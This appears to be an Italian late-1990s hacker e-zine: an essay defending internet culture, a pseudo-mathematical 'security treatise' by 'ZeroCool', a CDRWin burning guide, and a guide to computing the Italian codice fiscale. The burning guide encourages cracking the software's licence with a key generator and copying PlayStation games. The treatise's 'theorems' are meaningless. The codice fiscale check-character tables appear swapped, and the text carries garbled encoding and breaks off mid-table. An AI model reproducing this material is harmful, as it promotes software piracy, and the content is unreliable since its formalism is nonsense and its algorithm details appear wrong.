ma ecco alcuni esempi delle "leggende negative" che circondano la rete, come
hanno sempre circondato tutte le nuove tecnologie e, in generale, qualsiasi
modo nuovo di pensare o di comportarsi. Per fortuna sono passati i tempi dei
"diavoli di Laudun", se no qualche volta, ascoltando i commenti dei miei
amici che non hanno pratica della rete, avrei l'impressione di rischiare il
rogo...Il "cervello elettronico"Chi non ha mai usato un computer (o anche chi
lo usa, ma solo per una specifica applicazione, come scrivere o fare i conti)
ne ha una specie di mistico terrore. Conosco persone colte, intelligenti,
aperte all'innovazione, che mi guardano con diffidenza quando scoprono che
uso la "posta elettronica". C'e' una specie di "luddis mo culturale",
rinforzato da quella vasta letteratura che va alla ricerca del pittoresco o
del pauroso. C'e' il timore che un "cervello meccanico" finisca con
l'impadronirsi della nostra povera mente biologica; che la nostra identita'
si perda nel mondo "virtuale", che un'identita' estranea, un "avatar", si
impadronisca della nostra anima...Se solo sapessero quanto sono stupidi, in
realta', i computer e i "software" con cui siamo costretti a convivere...Si
leggono articoli su una tale psicologa americana che ha scoperto una
"sindrome da computer" (non piu' grave, o piu' frequente, di un attaccamento
esagerato al flipper, al gioco del pallone o allo scopone scientifico). Si
pensa "oddio, se il mio bambino tocca quel coso gli divorera' la mente".
Certo se avessi un bambino piccolo non mi piacerebbe che giocasse a Doom
(o a un altro dei giochi sanguinari e tenebrosi di cui c'e' stato fin troppo
commercio); ma non lo lascerei neppure troppo tempo davanti a certi cartoni
animati giapponesi o altri spettacoli violenti, o da incubo, che trasmettono
in televisione. Ne' lo incoraggerei a leggere molti generi di cose che si
trovano in libreria o nelle edicole. Ricordo che quand'ero bambino mi davano
molto fastidio, talvolta mi spaventavano, certe scene di film, compresi i
cartoni animati; e anche certe favole piene di orchi, di violenza e di
bambini orribilmente torturati.Invece penso che faccia benissimo all'educazio
ne di un bambino abituarsi all'uso di un sistema (non solo il computer, anche
il modem, cioe' la rete) che purtroppo non gli insegnano a scuola e che,
quando sara' grande, sara' diventato di uso comune. E anche giocare a uno dei
tanti giochi che stimolano l'intelligenza e la fantasia o con uno dei tanti
buoni (e spesso divertenti) "software" educativi che sono disponibili.

Il Pregiudizio telematico: Pornografi, pedofili, criminali e terroristi

Se badiamo a quello che scrivono i giornali, o ci dicono in televisione, la
rete sembra un posto pericolosissimo, in cui si annidano non solo gli hacker
(abitualmente dipinti molto peggio di quanto meritano) e i diffusori di
"virus", ma anche mafiosi, terroristi, nazisti, pornografi , pedofili e
criminali d'ogni sorta. Nessuno ha ancora detto (che io sappia) che in rete
si fa la "tratta delle bianche" o il contrabbando di testate atomiche, ma mi
aspetto di vederlo pubblicato da un giorno all'altro.Certo: ci sono, in rete,
personaggi "poco raccomandabili". Come ci sono dovunque intorno a noi. La
probabilita' di incontrarli e' minima; evitarli e' molto piu' facile che nella
nostra vita di tutti i giorni, perche' una banda di malintenzionati "veri"
incontrati in una strada buia non si puo' cancellare dalla faccia della terra
semplicemente cambiando "sito" con la pressione di un tasto, o spegnendo il
computer.La continua insistenza su questi temi "scandalistici" non e' solo
cattiva informazione, ma e' un danno culturale. Perche' tiene lontane dalla
rete molte persone civili e intelligenti, che farebbero meglio a esserci,
per il bene loro e di tutti noi che in rete gia' siamo, e le incontreremmo
volentieri. Perche' tende a consolidare la grave arretratezza dell'Italia in
rete, rispetto a molti altri paesi. E perche' tiene lontani dalla rete molti
bambini, che invece dovrebbero conoscerla, per arricchire la loro cultura e
imparare a muoversi nel mondo in cui vivranno.

Come difenderli dai "pericoli"?

Semplicemente con la normale prudenza che e' comunque bene esercitare. Da che
mondo e' mondo le mamme dicono alle bambine (e anche ai maschietti) "non
accettare caramelle da uno sconosciuto". Basta aggiungere "non dare mai il
tuo indirizzo di casa a qualcuno che non conosci". Lasciare un bambino da
solo per troppe ore davanti a un computer, senza guardare a che gioco sta
giocando, e' come abbandonarlo davanti alla televisione senza badare a che
programma sta guardando; e certo meno rischioso che mandarlo all'asilo,
all'oratorio o a scuola senza controllare che tipo e' la persona che se ne
occupa."ָ una fuga dalla realta', porta alla solitudine"Non e' vero. Se
qualcuno per natura e' misantropo, forse puo' trovare un rifugio nella rete.
Ma se c'e' in giro qualche persona cosi' dev'essere abbastanza rara, perche' in
quattro anni di "navigazione" frequente non ne ho incontrata neanche una.
Anzi, la maggior parte delle persone che frequenta la rete e' piuttosto
socievole. Qualche volta ride e scherza, qualche volta litiga, ma ha sempre
una forte spinta allo scambio, non solo di opinioni, ma anche di emozioni e
sentimenti.Fra i messaggi piu' frequenti che si incrociano ci sono cose come
"allora quando ci vediamo in pizzeria?" o, se si e' lontani, "quando passi
dalle mie parti"? Un gruppo di "telematici" storici, che gira intorno a tre
o quattro BBS a Milano, ha da anni un incontro fisso, tutti i giovedi', in un
bar vicino alla Scala. E cosi', in un modo o nell'altro, succede dovunque.
Sono pochissime le persone con cui ho "fatto amicizia" in rete e che non ho
poi incontrato di persona. Con quelle poche, ci stiamo dicendo: "speriamo di
riuscire a vederci presto". Certo, e' meno facile se una delle persone e' in
India e l'altra e' in Italia: ma ci potete scommettere che se una delle due
fara' un viaggio una delle prime cose che fara' sara' telefonare all'altra.
Mentre scrivo queste righe, due persone che ho incontrato in rete (una sta a
Barcellona, l'altra a Parigi) stanno organizzando un incontro di tutti e tre
in Provenza "per bere un bicchiere di vino insieme".Insomma il tessuto
fondamentale della rete non e' fatto di tecnologie, cavi, satelliti, macchine,
programmi o protocolli. ָ fatto di persone.La realta'Le reti "telematiche"
esistono da quasi vent'anni. Ma il fenomeno di cui si parla oggi, genericamen
te definito "internet", nella forma in cui lo conosciamo e' nato, in Italia,
alla fine del 1994; e nel resto del mondo non molto prima.

Ma che cos'e', questa internet?

Qualcuno immagina che ci sia una struttura omogenea, una singola rete,
chiamata "internet". Ma non e' cosi'. Le reti sono decine di migliaia, ognuna
completamente autonoma.Un lettore attento potrebbe chiedermi: se Internet non
e' un'unica rete, perche' la chiami "la rete"? Mi rendo conto dell'apparente
contraddizione, ma e' abitudine diffusa chiamarla, famigliarmente, the Net, o
"la rete". Perche' in pratica si comporta come se fosse una rete unica; e di
fatto e' un unico sistema seamless, continuo e intercomunicante. Ma mi sembra
importante capire che questo sistema e' policentrico, non ha un "governo"
centrale; non solo ogni rete, ma ogni operatore e' libero e indipendente.
Internet e' un sistema che permette a diverse reti di collegarsi fra loro,
in modo che chi e' collegato a una delle reti puo' comunicare con chiunque sia
collegato a una qualsiasi delle altre. In pratica da' a chi si collega la
percezione di muoversi in un singolo sistema globale; e il servizio che da'
e' proprio come se lo fosse.Non tutte le reti del mondo sono collegate al
l'internet (e tantomeno tutti i computer); ma chiunque voglia farlo si puo'
collegare al sistema.Soprattutto, questo sistema permette a ognuno di noi di
trasmettere informazioni, idee e opinioni; non solo di riceverle. Siamo
tutti, contemporaneamente, spettatori e protagonisti: il sistema ci permette
di essere davvero, e totalmente, interattivi. Il sistema funziona su scala
planetaria; non ha sede geografica, ne' confini. Si suddivide in comunita' che
non dipendono dal luogo fisico ma sono definite, per aree di interesse e di
argomento e per la natura dello scambio, dalla libera scelta di tutti coloro
che usano il sistema.Diversita' e nomadismo: il nuovo ritorna all'antico?
Mi sembrano interessanti alcuni aspetti della nuova "cultura elettronica"
che possono permetterci di superare i limiti dell'era industriale e dell'era
dei "mass media".Uno dei peggiori difetti della societa' in cui viviamo e' la
tendenza all'omogeneita'.  Il passaggio all'era industriale, ampiamente
deliniatoci dai lavori di Durkeim sulla solidarieta' e Tonnies sulla
distinzione tra Gemeinshaft e gesellschaft  ha portato alla "produzione in
serie". Abbiamo molta piu' scelta, molte piu' cose sono accessibili; ma sono
standardizzate, ripetitive, alienanti..Abbiamo piu' vestiti, ma nonostante le
bizzarrie della moda sono tutti uguali.L'era della produzione di massa e dei
"mass media" porta all'omogeneizzazione della cultura. Potremmo essere sulla
soglia di un cambiamento.Gia' nella scrittura qualcosa e' cambiato. Scrivere a
macchina voleva dire usare un unico carattere, sempre della stessa grandezza.
Non c'era piu' calligrafia, ne' la possibilita' di scrivere piu' grande o piu'
piccolo, piu' chiaro o piu' scuro, collocare le parole diversamente sulla
pagina, inserire qua e la' una freccia o un disegno. Con un computer, tutto
questo e' di nuovo possibile; possiamo scegliere fra centinaia di caratteri,
cambiarne la dimensione come ci pare, impaginare come vogliamo, usare neretti
e corsivi, inserire simboli e disegni. Insomma esprimerci in modo molto piu'
personale.Con la comunicazione interattiva, la rivoluzione e' ancora piu'
grande. Gli spazi di dialogo sono infiniti, ognuno di noi ne puo' creare a
volonta'. C'e' una possibilita' tutta nuova di coltivare la diversita'. Anche
l'industria sta imparando a essere piu' flessibile. Con le tecnologie di oggi
diventa piu' facile fare prodotti "su misura" e anche offrire piu' spazio al
"fai da te". Se per tagliare un tessuto si usa il laser invece di una sega,
una fabbrica remota puo' farci un vestito non solo su misura, ma anche secondo
il nostro disegno. Anche in tanti altri settori la tecnologia permette di
personalizzare il prodotto. Cosi' puo' realizzarsi l'ipotesi di Alvin Toffler,
la nascita del prosumer, che e' insieme consumatore e produttore. Come vedremo
nel prossimo capitolo, l'economia globale di oggi e di domani crea sempre
maggiori possibilita' per i piccoli operatori. Puo' rinascere e trovare nuovo
vigore l'artigianato; moltiplicarsi la diversita' non solo nelle idee, ma
anche negli oggetti.Molti pensano, credo con ragione, che la globalita' del
molteplice porti non solo al rinascere di infinite tribu', ognuna con la sua
cultura, ma ci aiuti anche a ritrovare il nostro antico istinto di nomadi.
Non solo perche' possiamo vagare come ci piace nella rete, ma anche perche'
possiamo spostarci fisicamente senza perdere contatto con i nostri amici e
con il nostro lavoro. Forse e' un sogno; forse solo una minoranza piu' vivace
e curiosa sapra' approfittare davvero di queste nuove possibilita'. Ma (almeno
per me) e' affascinante pensare a un'umanita' meno stanziale, meno omogenea e
piu' nomade; a spazi crescenti per la liberta' e la fantasia. Che cosa vuol
dire, "interattivita'"?"Interattivita'"La sentiamo e la leggiamo usata in tanti
modi diversi. Perdonatemi questa pignoleria "socratica", ma se non si
stabilisce bene il senso delle parole si rischia di non capirsi; e su questo
argomento la confusione abbonda. ָ uno solo il significato di "interattivita'"
nel mondo di cui parliamo qui, sulla "frontiera elettronica", sulla cresta
della "quarta ondata".Sentiamo dire che un'interfaccia e' "interattiva" perche'
se diamo un certo comando, o premiamo un certo pulsante, esegue un ordine; o
perche' se scegliamo, una domanda, in una serie gia' predisposta, ci da' la
risposta precostituita. E magari se sbagliamo, o diamo un comando non
previsto, emette un segnale acustico e ci dice "No! questo non si puo' fare".
Sarebbe come dire che e' "interattiva" una macchinetta per la distribuzione
del caffe' che ci permette di sceglierlo dolce o amaro, con o senza latte;o
la spia della pressione dell'olio sul cruscotto della nostra automobile.
Sentiamo dire che un cd-rom e' "interattivo" perche' ci permette di scegliere
che cosa vogliamo leggere o vedere, e in risposta a certi nostri
comportamenti puo' emettere suoni o parole standardizzate. A questa stregua,
e' interattivo anche un juke-box, o una bambola che dice "mamma" quando le
schiacciamo il pancino.Posso ammettere che un'enciclopedia su cd-rom posa
essere definita "ipertestuale": il neologismo e' un po' comico, ma almeno e'
preciso. Non so che senso abbia definirla "interattiva". Sentiamo dire che
un gioco e' "interattivo" perche' segue una sua logica precostituita e non ci
fa "vincere" se non siamo abbastanza abili, veloci o ragionanti per capire
dove sono le trappole o gli indovinelli; o perche' alle nostre "mosse"
contrappone le sue risposte, secondo le regole stabilite da chi ha scritto
il programma. Per quanto raffinato, complesso, ingegnoso e divertente possa
essere il gioco, non e' piu' interattivo di un giocattolo elettrico che accende
una lucina, o emette un suono di approvazione, quando il bambino sceglie la
risposta giusta; e invece grugnisce se la risposta e' sbagliata. Di questo
passo, si potrebbe definire "interattivo" un biglietto della lotteria "gratta
e vinci".Cerchiamo di semplificare: se cio' con cui "interagiamo" e' una
macchina, o un programma automatico, e non una persona, non si tratta di
"interattivita'" nel senso di cui parliamo in questo contesto. Ci sono anche
situazioni umane, per esempio trasmissioni televisive, che si definiscono
"interattive", perche' il pubblico puo' rispondere facendo un certo numero di
telefono, e "votare"; o perche' arrivano direttamente al conduttore, in
diretta, le telefonate dei telespettatori. Come ho gia' detto, questa e'
interattivita' "finta". Perche' qualcuno, unilateralmente, stabilisce le
regole, definisce i criteri, governa il dialogo come vuole; e tutti gli
altri non possono far altro che muoversi all'interno di piccoli spazi ben
definiti, usare una "ribalta", per dirla con Goffman. E non cambiera' affatto
la situazione se un giorno, invece di usare il telefono, lo spettatore potra'
premere un pulsante.Se e quando ci saranno 500 canali, video on demand,
collegamenti con giornali, riviste, biblioteche, cineteche e gallerie di
negozi online attraverso un televisore digitale, eccetera... lo spettatore
(se lo vorra') avra' piu' potere, perche' avra' piu' liberta' di scelta. Ma non ci
raccontino favole: non sara' una situazione "interattiva". Se noi dovremmo
chiamare "interattivo" il telecomando, o il dito che volta la pagina di un
giornale, o la mano che sceglie negli scaffali di una libreria o di un
supermercato."Interattivita'", almeno in queste pagine, significa una cosa
completamente diversa. Un dialogo ad armi pari, in cui nessuno ha privilegi,
in cui tutti hanno il medesimo status di opinione e lo stesso diritto di
parola. Questo e' il terreno su cui deve imparare a muoversi chi vuol fare
comunicazione nella rete, che non sia solo una "brutta copia" di metodi e'
meglio riservare a quei mezzi per cui sono nati. Questa e' la possibilita'
che si offre a ognuno di noi - se abbiamo la voglia, la pazienza e la
curiosita' di esplorare nuovi orizzonti, cercare nuovi stimoli, scambiare
idee e opinioni con tante persone che in nessun altro modo avremmo
l'occasione di conoscere.
                                                           Anonimo

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
------------------------------------------------------------------------------
--------------------TRATTATO SULLA SICUREZZA INFORMATICA----------------------
------------------------------------------------------------------------------
di: ZeroCool

Definire un sistema sicuro e pura eresia . Abbiamo diversi tipi di sistema
operativi che vengono definiti tali da certificazioni governative come ad
esempio Nt o Unix . Un sistema in se stesso per essere sicuro dovrebbe
resistere ad ogni tipo di attacco interno od esterno ad esso senza doverne
subire mutamenti nel tempo . Possiamo quindi dire che NT o Unix sistemi in
continuo mutamento definito upgrade non risultano sicuri per date e tempo.
Dal trattato di Murpd possiamo dire che un sistema puo essere definito sicuro
se anche subendo dei cambiamenti nel tempo risulta efficace nella sua
coattivita . Cio non risulta possibile visto che un sistema quando installato
quindi in tempo 0 risulta insicuro visto che vanno definite delle sue
variabili fondamentali. Possiamo quindi dire che in tempo 1 basandoci appunto
sul primo dato 0 il teorema stesso risulta superato . Definiamo quindi la
sicurezza di un sistema una possibilita remota che si manifesta solo in tempo
1 nell arco che intercorre  [ 0 / 1 ] possiamo trovare vari avvenimenti
interni o esterni al sistema che possono rendere la sicurezza del sistema
stesso uguale a 0 [ su una scala da 1 a 10 ] .
Troppe quindi sono le variabili da prendere in considerazioni per certificare
la sicurezza di un sistema stesso .

Il tutto puo essere riassunto da un teorema:

           0                                           1
           """""""""""""""""""""""""""""""""""""""""""""
             n                                      n
           OS  + v   <          S              <  OS  +v+-[1] 

  OS=  operative system 
   n=  casualita 
   v=  elementi inerni o esterni
   s=  sicurezza

Possiamo dire quindi per certo che un sistema non puo essere sicuro in
qualsiasi caso. Certo e che la specializzazione del sistema in un settore
ne causa la morte negli altri .
Quindi un sistema non puo essere sicuro e la specializzazione dello stesso
ne causa la cessazione.
Abbiamo quindi un schema gerarchico dal quale possiamo subito trarre delle
conclusioni . Un sistema in tempo 0 e se collegato alla rete interna o
esterna risulta vulnerabile . Un piccolo appunto una intrusione informatica
non deve per forza essere fatta da altri sistemi che si connettono attraverso
nodi remoti or similar . Una intrusione puo anche essere fatta da una persona
fisica che si collega con i proprio mezzi alla macchina vulnerabile . Visto
che per definizione una intrusione e fatta da sistemi operativi verso altri
sistemi operativi possiamo considerare l essere umano stesso un sistema
operativo [ quindi anche esso vulnerabile ] pur avendo l elemento coscienza
che lo differenzia dagli altri sistemi e lo differenzia.


                     SICUREZZA E LEGISLAZIONE INFORMATICA

Questa parte del trattato e rivolta agli utenti della cosi definita Grande
Rete o meglio Internet in tutte le sue forme Internet e internet 2 . La rete
in se stessa nata per trasferire informazioni tra centri di calcolo
governativi e poi definita pubblica per la sua notevole importanza. In
questo momento la legislazione informatica risulta insicura e incerta in
molti suoi aspetti . Come ben sappiamo internet e definita rete globale e
quindi per quanto rete di diverse nazioni o meglio stati . Ogni stato ha
una sua precisa legislazione e quindi leggi che ne definiscono l andamento e
i problemi di sicurezza . Molto spesso pero queste leggi risultano incerte
quando come spesso succede un cosi definito hack avviene da uno stato all
altro con diverse legislazioni . Semplicemente un semplicemente un esempio
poterebbe essere un hack il cui attaco parte dalla germania verso un sistema
remoto negli Stati Uniti . Quale delle due legislazioni attuare ? . Ogni
stato in quanto tale risulata entita forte e dominante connesso attraverso
una rete di trattati agli altri stati che accettano e riconoscono la sua
entita. In questo caso pero abbiamo due diverse legislazioni che si riconosco
a vicenda. Quale delle due verra applicata . Certamente l hacker essendo
della germania verra processato attraverso la legislazione germanica e quindi
europea ma l hack e avvenuto negli Stati Uniti quindi il danno economico che
provabilmente si e creato riguarda non la germania ma gli Stati Uniti stessi.
Non facile definire come queste situazioni possano essere risolte . Quindi
risulta molto piu facile per un hacker scappare o essere facilitato dalla
lentezza burocratica che si crea . Ovviamente questo non puo avvenire se
l hack e il sistema remoto hacked sono nello stesso stato.

Si puo quindi definire una legislazione che garantisca un giusto e onesto
processo insufficente quando avviene tra stato e stato [ ma a volte anche
nello stato stesso ] possiamo quindi ricondurre quindi al trattato dellla
sicurezza questa parte :

                                                 Rete Collegata a Internet
  0                                                                          1
  """"""""""""""""""""""""""""""""""""""""""""" ------------------------------
    n                                      n
  OS  + v   <          S              <  OS  +v+-[1]        S              -n

  OS=  operative system 
   n=  casualita  
   v=  elementi inerni o esterni
   s=  sicurezza

In n possiamo includere la lentezza burocratica che facilita l hack di un
sistema che gia in stato o 0 o 1 e latente di sicurezza tutto cio.

                                                ZeroCool

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
                       __   ___ _ _______ ____    ____
                      /  |\/  /| |_   ___| __ \  / _  |\
        -------------/   |/  / | |_\  \__|   _/\/ /\/ / |--------------
      --------------/  /|   / /| |  \  \ | | \\/ /_/ / /-------------
                   /__/ |__/ / |_|   \__\|_|\_\|___ / /
                   \__\/\__\/  \_\    \__\__\\_\____\/  THe DeMoN (c)
  
                          CoMPuTeR'S HeaVen SoCiEtY

*****************************************************************************
**************************** SoFTWaRe  CoLLeCTioN ***************************
*****************************************************************************

Presenta
        La MaXi GuiDa Su CoMe Farsi....
        uNa FiG... (Cazzo questa non  una sex_guide ho toppato)
        uN CD-RoM CoN CDRWin 3.7C

Occorrente:
        500.000 circa per comperarsi un fottuto masterizzatore IDE
        3000 circa per un CD vuoto
        1,5 l di Coca ( - Cola, ovvio )
        dai 40 ai 80 min. della tua vita ....
        Un BEL pacchetto di MARLBORO LIGHT .... uno ?!

Bene, cominciamo...
Innazitutto procuratevi CDRWin all'indirizzo http://www.goldenhawk.com e poi
se avete cazzi anche il key generator per registrarlo o comperatevelo o
crackatevelo o fateci quel cazzo che volete basta che poi funzioni.
Ora lanciatelo, altrimenti nei cd vergini vi ci potete solo specchiare...

Adesso si parte seriamente:

Dipende tutto da che cosa volete fare con il programma...

1 Nozioni base sulla masterizzione
2 Creare e registrare un Iso 9660
3 Copiare un fottutissimo vieogioco della Play ( o qualsiasi altro CD-ROM )
4 Copiare un cd audio
5 Creare un cd audio
6 Aggiungere una sessione ad un CD

(1) NOZIONI BASE SULLA MASTERIZZAZIONE

Innazitutto deovete sapere come settare al meglio il vostro masterizzatore:

-Impostare il masteriz come slave e il vostro cd-rom come master (questo non
 vale per i masteriz SCSI che vengono messi in catena con ID da 1 a 7 ).

-Disabilitare l'opzione DMA sia del masteriz che del CD-ROM (NB. per i DVD
 invece  bene che questa sia abilitata).

-Masterizzare preferibilmente a 2X con quelli IDE sia perch il risultato
 del vostro tempo perso pu• non essere letto da tutti i CD-ROM, in particolar
 modo su quelli pi— vecchi, sia perch con questa archittetura pi— aumentate
 la velocit… pi— aumentate il rischio di fottervi un CD. Ovviamente questo
 non vale per i masteriz SCSI che utilizzano tutta un' altra archittettura di
 trasferimento dati...

-Un' altra opzione dei programmi di masterizzazione che ritengo importante,
 sia che si possieda uno masteriz SCSI che IDE,  il fatto di poter creare
 un' immagine su HD dei CD da copiare....  pi— sicuro farlo sepmre anche se
 perderete sicuramente 10 ~ 20 min. del vostro tempo perso davati alla TV :-) 
 proterete cos verificare la lettura eseguita prima di scrivere ....

-Disabilitate lo screensaver e tutti gli alti programmi residenti come gli
 antivirus e non usate nulla mentre il masteriz st… scrivendo potrebbe andare
 a fanculo il vostro costosissimo CD ( 3000 ) :-)

                           -<=************=>-

           VEDIAMO ORA COME FUNZIONA STO BASTARDO DI CDRWin ....

                           -<=************=>-

(2) CREARE E RGISTRARE UN ISO 9660

Innazitutto bisoga dire che l' ISO9660  un particolare CD in formato standard
ossia ha una FAT riconoscita dalla pressoch totatlit… dei CD-ROM.
Diciamo che con questo formato si possono aggiungere pezzi al CD
successivamente alla prima scrittura sempre che non si sia chiuso il CD:
questa tecnica  detta multissessione... OK lo so che questo  un tutorial
per nofiti ma, cazzo, un po' di teoria non gli f… sicuramente male poi non ho
dato neanche una definizione in modo serio.... Ho bisogno di una sigaretta...
Ho finalmente posso riprendere seriamente...  SCUSATE PICCOLO SFOGO ....
Per creare un CD in formato ISO dovete cliccare sul IV pulsante in alto " File
Backup and Tools "e dovrebbe aprisi una schermata dove nel primo campo vi
appare una combobox nella quale potete selezionare pi— opzioni: sciegliete
" Build and Record an ISO9660 Image File ". Nella parte pi— in basso affianco
ai pulsanti ADD DELETE CLEAR potete inserire i file o le cartelle che volete
registrare con un semplice DragAndDrop oppure cliccare sul pulsante ADD e
selezionare quelle cazzateche volete registrare. Nel campo sottostante
inserite il nome e la locazione del file ISO da creare su disco prima della
scrittura ( ricordatevi di cancellarlo una volta testato il risultato del
vostro duro lavoro, perch questo  un' immagine del CD e quindi ha le sue
stesse dimensioni ) Qeste devono apparire nel campo l a fianco. Teoricamente
ora potete gia scrivere il vostro CD ma vediamo che parametri settare...
Controllate che le check " Include Hidden Files ", " Recurse Subdirectories "
e " Include System Files " siano sputatealtrimenti i file nascosti non verrano
scritti,le sottocartelle neppure, e neanche i file di sistema ivi contenuti.
Interessante  la funzione del check " Preserve Full Pathnames ": se spuntato
il programma registrer… anche la struttura delle directory precedente al
livello che avete inserito nel campo sopra partendo dalla Rootdirectory
altrimenti scriver… tutto partendo solo dal livello da voi imposto.
Sotto troverete altri check, quelli che useremo sono: " Long Filenames
(Joliet) ", " Finalize Session ", " Verify Recorded Image ", tutte le altre
lasciatele stare di default. La check long file abilita il supprto per i nomi
lunghi anche sul vostro bel CD, cosa vivamente consigliata se lavorate in
ambiente Windows95 / 98; la check finalize session chiude la sessione che
avete aperto per il vostro lavoro in modo tale che il CD che avete realizzato
sia leggibile su tutti gli altri CD-ROM; l'ultima check in esame in questa
form, verify recorded.. ,serve per analizzare il risultato confronatadolo con
l' ISO di origine. ANFF ANFF !!! Abbiamo quasi finito ci manca ancora poco...
Nella label ISO9660 Options c' un pulsante dal nome " Advanced Options ",
clickateci sopra e vi si aprira un' altra form, l' ultima prima di premere
il mitico pulsante " START ", ve lo prometto...
Nella prima cartella " Volume Descriptor " potete settare tutte le opzioni
dell' etichetta di volume: quella che ci interessa  solo la prima, ossia
" Volume Label ". In questo campo inserite il nome che volete dare al vostro
CD.
VIAAAAAAAA !!!!!! ora confermate l' opzione settata in questa form e poi
premete il fottuto pulsante: quindi tanti auguri che tutto vada bene, e
toccatevi non si sa mai, i CD a volte si fottono, anche per altri motivi,
da soli....

                           -<=************=>-

(3) COPIARE UN CD DELLA PLAY ( vale anche per tutti gli altri )

La procedura qu di seguito spiegata parte dal presupposto che sul vostro HD
ci sia posto sufficiente per l' immagine del CD che state copiando ( fanculo
alla Sony se  un videogioco della Play ) Ps: perch funzionino questi CD-ROM
dovete avere la modifica nella Play Lo Sapete VERO ?? ...

---------------------------- FINE PRIMA PARTE --------------------------------

                                                      Nitro The Demon
                                                 CoMPuTeR'S HeaVen SoCiEtY

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

Ciao a tutti. qui da nowhere c'e' il vej99 che oggi parlera' di....

[[[[[[[[[[[[ COME CALCOLARE IL CODICE FISCALE!!! ]]]]]]]]]]]]]]]

solite caxxate iniziali...
th1s is ded 2: my girl · flex · the FG crostino kru · FMC       \/
               miki · vazim and all the coolz out there       .-++-.
music h3ard  : undeclinable ambuscade & ten foot pole        / /  \ \   
consumed     : i mustacciuoli di nonna lisetta               |/----\|
used         : gvim on debian2.1 con la sintassi tcl/tk ;)   X      X
a b1g FUCK 2 : tutti i rompic0gli0ni su questa terra =(     / ·----· \

bien bien.. si parte! 
allor.. avete presente quei simpatici abbonamenti telecum, oppure 
tutti quei simpatici form sul web che non vi fanno andare avanti nelle 
vostre grandi imprese hackz:) a meno che non mettiate quella simpatica
stringa di 16 lettere e numeri??? bene... oggi impareremo a calcolarlo!

ps.. tutte le info le ho trovate con dejanews e su it.comp.lang.vb (sul
 sito del ministero NS non ci voleva andare ;))) quindi denghiu 2 U all

facciamo finta di voler calcolare il codice fiscale del signor
Crostoni Massimiliano, residente in Troia(FG), nato l'11/11/1911 di sex
feMMina hihihi
il codice e' cosi' composto:
CRS MSM 11M11 L447 piu' l'ultimo char che calcoleremo dopo..

                             -= CRS =-
le prime 3 lettere sono le prime 3 consonanti del cognome (1a 2a e 3a)
se x caso le consonanti sono - di 3, si aggiungono le vocali in ordine
se il cognome e' + corto di 3 caratteri, si aggiunge una X x ogni char
mancante
x le donne sposate il cognome e' il loro da nubbili, mentre i cognomi
composti si considerano tutt'1

                             -= MSM =-
queste sono la prima, seconda e quarta consonante del nome... se
il nome e' + corto di tre caratteri, si mette una X per ogni car. mancante,
se invece le consonanti non bastano si mettono le vocali in ordine
x le donne,, hem e' lo stesso :)
i nomi tipo "libero marcello" sono tutt'uno (liberomarcello)

                             -= 11M11 =-
questa e' la data di nascita... le prime 2 cifre sono le ultime due dell'
anno di nascita (1969 = 69), M e' il mese di nascita, secondo questa sem-
blice tabellina:
+-----------------+------------------+-----------------+---------------+
|  A= Gennaio     |  B= Febbraio;    |  C= Marzo;      |  D= Aprile;   |
|  E= Maggio      |  H= Giugno       |  L= Luglio;     |  M= Agosto;   |
|  P= Settembre;  |  R= Ottobre;     |  S= Novembre;   |  T= Dicembre  |
+-----------------+------------------+-----------------+---------------+
                                                           tab 1

mentre le ultime due cifre sono il giorno di nascita.. da 01 a 28 - 31
nel caso dei boyz, mentre e' il giorno di nascita + 40 nel caso delle
girlz

                             -= L447 =-
e' la parte + semplice del codice.. cioe' un particaolare codice :) asse-
gnato dal mini$tero di qualcuno, cioe' dalla "Direzione generale del
Cata$to" a ogni comune italiano. il database contenente le corrispondenze
comune-codice lo trovate.... in allegato (forse ;). Se invece il nostro
amico massimiliano fosse residente in uno stato estero... avrebbe un co-
dice corrispondente allo stato in cui e' residente.. ed il DB (forse) lo
trovate in allegato.. non dipende dal vej :)

l'unico carattere x cui e' conveniente avvalersi (uao!) di un prog che
calcoli x noi il nostro codice... possibilmente facendolo da noi (che e'
meglio come dice quattrocchi) e' l'ultimo.. il cosiddetto carattere di
controllo. questo char si ottiene convertendo i caratteri che nel codice
sono in posizione dispari secondo la tab 2:
+------+------+------+------+------+------+------+------+------+------+
| 0=0  | 1=1  | 2=2  | 3=3  | 4=4  | 5=5  | 6=6  | 7=7  | 8=8  | 9=9  |
| A=0  | B=1  | C=2  | D=3  | E=4  | F=5  | G=6  | H=7  | I=8  | J=9  |
| K=10 | L=11 | M=12 | N=13 | O=14 | P=15 | Q=16 | R=17 | S=18 | T=19 |
| U=20 | V=21 | W=22 | X=23 | Y=24 | Z=25 |      |      |      |      |
+------+------+------+------+------+------+------+------+------+------+
                                                                  tab 2
nel caso del nostro massimiliano i char in posizione dispari sono:
C=2 (S=18)x2 1 M=12 1 4 7, che danno come somma 63 (metti da parte:)

i caratteri in posizione pari si convertono secondo tab 3:
+------+------+------+------+------+------+------+------+------+------+
 0=1   1=0   2=5   3=7   4=9   5=13 | 6=15 | 7=17 | 8=19 | 9=21 |
 A=1   B=0   C=5   D=7   E=9   F=13  G=15  H=17  I=19  J=21 |
 K=2   L=4   M=18  N=20 | O=11 | P=3   Q=6   R=8   S=12  T=14 |
 U=16 | V=10 | W=22 | X=25 | Y=24 | Z=23 |      |      |      |      |
+------+------+------+------+------+------+------+------+------+------+
                                                                  tab 3
la somma dei caratteri pari (R=8 (M=18)x2 1=0 1=0 L=4 4=9) invece e' 57
ora si somma 63 a 57 (120) e si divide tutto x 26 = 4. il resto della
divisione va ora convertito secondo tab 4... in questo caso il resto e'
120 - 26 x 4 = 18, quindi il carattere di controllo e' Q
								  
+------+------+------+------+------+------+------+------+------+------+
 0=A   1=B   2=C   3=D   4=E   5=F  | 6=G  | 7=H  | 8=I  | 9=J  |
